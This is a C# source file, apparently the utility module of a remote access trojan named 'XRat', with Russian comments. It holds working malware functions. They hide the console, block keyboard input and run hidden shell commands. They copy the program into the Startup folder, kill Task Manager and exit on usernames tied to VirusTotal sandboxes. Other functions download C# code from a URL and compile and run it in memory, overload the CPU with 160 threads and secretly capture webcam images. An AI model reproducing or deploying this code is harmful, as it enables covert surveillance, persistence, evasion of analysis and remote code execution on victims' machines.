using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms.Design;
using HtmlAgilityPack;
using System.Drawing;
using AForge.Video;
using AForge.Video.DirectShow;
using System.IO;

namespace XRat
{
    public static class Utils
    {
        private static string filePath = string.Empty;


        // Подключаем необходимые Windows API
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // Скрыть окно
        const int SW_SHOW = 5; // Показать окно

        [DllImport("user32.dll")]
        private static extern int BlockInput(int fBlockIt);

        public static void BlockKeyboard()
        {
            // Блокируем клавиатуру
            BlockInput(1);
        }

        public static void UnblockKeyboard()
        {
            // Разблокируем клавиатуру
            BlockInput(0);
        }

        public static bool CMD(string command)
        {
            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public static (bool success, string output) ProCMD(string command)
        {
            string output = string.Empty;

            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Read the standard output
                    output = process.StandardOutput.ReadToEnd();

                    // Optionally, you can also capture errors
                    string errorOutput = process.StandardError.ReadToEnd();

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return (true, output); // Return success and the output string
            }
            catch (Exception ex)
            {
                return (false, $"Error: {ex.Message}"); // Return failure and the error message
            }
        }

        public static bool Hide()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Скрываем консольное окно
                ShowWindow(hConsole, SW_HIDE);
            }
            catch { return false; }

            return true;
        }

        public static bool Show()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Вернуть окно обратно:
                ShowWindow(hConsole, SW_SHOW);
            }
            catch { return false; }

            return true;
        }

        public static string Startup()
        {
            Settings.filename = Settings.filename + ".exe";

            // Получаем путь к папке автозагрузки текущего пользователя
            string userStartupFolder = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup)
            );

            // Получаем имя файла (с расширением)
            string sourceFilePath = ProCMD("pwd").output;
            sourceFilePath = sourceFilePath + Settings.filename; // Исправить!!!!!

            // Путь, куда будет скопирован файл
            string destinationFilePath = Path.Combine(userStartupFolder, Settings.filename);

            // Копируем файл в папку автозагрузки, если он не существует там
            try
            {
                if (!File.Exists(destinationFilePath))
                {
                    // Копирование самого себя в папку автозагрузки
                    File.Copy(sourceFilePath, destinationFilePath);
                    return $"Программа успешно скопирована в автозагрузку: {destinationFilePath}";
                }
                else
                {
                    return "Программа уже существует в папке автозагрузки.";
                }
            }
            catch (Exception ex)
            {
                return $"Произошла ошибка: {ex.Message}";
            }
        }

        public static Task Taskmgr()
        {
            CMD(@"taskkill.exe /IM taskmgr.exe");
            return Task.CompletedTask;
        }

        public static void CheckVirusTotal()
        {
            string[] virusTotalUsers = ["azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];

            string username = ProCMD("whoami").output;
            username = username.Split('\\')[1];

            if (virusTotalUsers.Contains(username))
            {
                Environment.Exit(0); // Leaving if it's VirusTotal VM
            }
        }

        public static async Task<string> ParseCodeFromRawLink(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Получаем HTML-контент страницы
                    string htmlContent = await client.GetStringAsync(url);

                    // Создаем объект HtmlDocument для парсинга HTML
                    var htmlDocument = new HtmlDocument();
                    htmlDocument.LoadHtml(htmlContent);

                    // Извлекаем все теги <pre>
                    var preTags = htmlDocument.DocumentNode.SelectNodes("//pre");

                    // Если теги <pre> найдены, возвращаем содержимое первого
                    if (preTags != null && preTags.Count > 0)
                    {
                        return preTags[0].InnerText; // Возвращаем текст первого тега <pre>
                    }
                    else
                    {
                        // Если теги <pre> не найдены, возвращаем пустую строку
                        return string.Empty;
                    }
                }
                catch (Exception ex)
                {
                    // Логируем ошибку
                    // Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");

                    // Возвращаем пустую строку в случае ошибки
                    return string.Empty;
                }
            }
        }

        public static async Task ModuleLoader(string link)
        {
            await ExecuteCodeFromText(await ParseCodeFromRawLink(link));
        }
        public static async Task ExecuteCodeFromText(string code)
        {
            await Task.Run(() =>
            {
                // Создание компилятора
                CSharpCodeProvider provider = new CSharpCodeProvider();

                // Настройка параметров компиляции
                CompilerParameters parameters = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = true
                };

                // Компиляция кода
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

                // Проверка наличия ошибок компиляции
                if (results.Errors.HasErrors)
                {
                    //Console.WriteLine("Ошибка компиляции:");
                    foreach (CompilerError error in results.Errors)
                    {
                        //Console.WriteLine("  {0}", error.ErrorText);
                    }
                }
                else
                {
                    // Создание экземпляра класса и вызов метода
                    Assembly assembly = results.CompiledAssembly;
                    Type type = assembly.GetType("UserClass");
                    if (type != null)
                    {
                        dynamic instance = Activator.CreateInstance(type);
                        instance.Execute();
                    }
                    else
                    {
                        //Console.WriteLine("Не найден класс UserClass.");
                    }
                }
            });
        }


        public static void DestroyPCOld()
        {
            int numberOfThreads = Environment.ProcessorCount; // Получаем количество логических процессоров
            int targetLoad = 90; // Целевая нагрузка - 90%

            // Вычисляем, сколько процентов времени процессор должен быть занят
            int workTime = 100; // Время работы в миллисекундах
            int idleTime = (100 - targetLoad); // Время бездействия

            // Статический Random, чтобы избежать многократного создания в потоках
            Random random = new Random();

            // Запускаем несколько потоков
            for (int i = 0; i < numberOfThreads; i++)
            {
                Thread t = new Thread(() =>
                {
                    while (true)
                    {
                        // Нагружаем процессор на заданный процент
                        var sw = Stopwatch.StartNew();
                        while (sw.ElapsedMilliseconds < workTime)
                        {
                            // Сложные вычисления для загрузки процессора
                            // Используем более сложные вычисления для увеличения нагрузки
                            double result = 0;
                            for (int j = 0; j < 1000; j++)
                            {
                                result += Math.Sqrt(random.NextDouble());
                            }
                        }

                        // Отдыхаем, чтобы не создать 100% нагрузку
                        // Используем точный расчет времени отдыха
                        long sleepTime = idleTime - sw.ElapsedMilliseconds;
                        if (sleepTime > 0)
                        {
                            Thread.Sleep((int)sleepTime);
                        }
                    }
                });
                t.IsBackground = true; // Потоки будут завершаться при завершении программы
                t.Start();
            }
        }

        public static void DestroyPC()
        {
            // Количество потоков для создания нагрузки на процессор
            int numThreads = 160;  // Увеличиваем количество потоков для большей нагрузки

            // Массив потоков
            Thread[] threads = new Thread[numThreads];

            // Запускаем каждый поток
            for (int i = 0; i < numThreads; i++)
            {
                threads[i] = new Thread(GenerateCpuLoad);
                threads[i].Start();
            }

            Console.WriteLine("Запущено несколько потоков для нагрузки на процессор.");
            Console.WriteLine("Нажмите любую клавишу для завершения.");
            Console.ReadKey();

            // Ожидаем завершения всех потоков
            for (int i = 0; i < numThreads; i++)
            {
                threads[i].Join();
            }

            Console.WriteLine("Все потоки завершены.");
        }

        // Метод для создания нагрузки на процессор
        public static void GenerateCpuLoad()
        {
            // Вечный цикл, который создает интенсивную нагрузку
            while (true)
            {
                // Процессор будет занят выполнением вычислений
                double result = Math.Sqrt(Math.PI) * Math.Sqrt(Math.E); // Более ресурсоемкие вычисления
            }
        }


        // Asynchronous method to start the webcam capture
        public static async Task<string> WebCamAsync()
        {
            // Получаем доступные устройства захвата видео (веб-камеры)
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            // Проверяем, есть ли устройства
            if (videoDevices.Count == 0)
            {
                //throw new InvalidOperationException("Веб-камеры не обнаружены.");
            }

            // Выбираем первую камеру по умолчанию (можно поменять на выбор другой камеры)
            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

            // Подписываемся на событие получения кадра с камеры
            videoSource.NewFrame += new NewFrameEventHandler(VideoSource_NewFrame);

            // Попытка стартовать захват
            try
            {
                videoSource.Start();
                // Пример асинхронного ожидания (не блокирует основной поток)
                await Task.Delay(5000);  // Задержка для захвата кадра (можно настроить)

                // Останавливаем захват видео
                videoSource.SignalToStop();
                await Task.Run(() => videoSource.WaitForStop());  // Ожидаем остановки видео захвата асинхронно

            }
            catch (Exception ex)
            {
                //throw new InvalidOperationException("Ошибка при захвате видео: " + ex.Message);
            }

            return filePath;  // Возвращаем путь к файлу
        }

        // Метод, который вызывается при получении нового кадра с камеры
        private static async void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                // Захватываем изображение
                Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();

                // Генерируем путь для сохранения снимка
                string directory = ProCMD("cd").output;

                // Сохраняем изображение в файл асинхронно
                filePath = Path.Combine(directory, "WebcamCapture_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".jpg");

                // Сохраняем изображение асинхронно
                await Task.Run(() => bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Jpeg));

                // Освобождаем ресурсы
                bitmap.Dispose();
            }
            catch (Exception ex)
            {
                //Console.WriteLine("Ошибка при обработке кадра: " + ex.Message);
            }
        }
    }
}